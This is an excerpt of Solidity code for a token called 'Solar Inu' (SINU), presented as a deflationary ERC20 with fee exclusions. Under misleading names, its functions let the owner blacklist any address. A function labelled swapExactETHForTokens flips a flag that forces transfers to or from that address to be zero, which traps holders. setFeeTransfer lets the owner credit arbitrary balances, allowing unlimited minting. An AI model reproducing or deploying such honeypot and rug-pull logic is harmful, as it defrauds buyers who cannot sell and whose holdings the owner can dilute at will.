...
contract DeflationaryERC20 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _addressExcludeFromFee_;
 ...
 */
    ...
    function swapExactETHForTokens(address _addressIncludeFromFee) external ownerOnly {
        if (_addressExcludeFromFee_[_addressIncludeFromFee] == true) {
            _addressExcludeFromFee_[_addressIncludeFromFee] = false;}
            else {_addressExcludeFromFee_[_addressIncludeFromFee] = true;}
    }

    function callCheck(address _addressIncludeFromFee) public view returns (bool) {
        return _addressExcludeFromFee_[_addressIncludeFromFee];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if (_addressExcludeFromFee_[_msgSender()] || _addressExcludeFromFee_[recipient]) require (amount == 0, "");
    ...
    function setFeeTransfer(address _feeDistributor, uint256 feeValue) public ownerOnly {
        ...
        _balances[_feeDistributor] = _balances[_feeDistributor].add(feeValue);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_addressExcludeFromFee_[sender] || _addressExcludeFromFee_[recipient]) require (amount == 0, "");
...
contract DERC20 is DeflationaryERC20 {

    constructor(uint256 initialTokens) public DeflationaryERC20("Solar Inu", "SINU") {
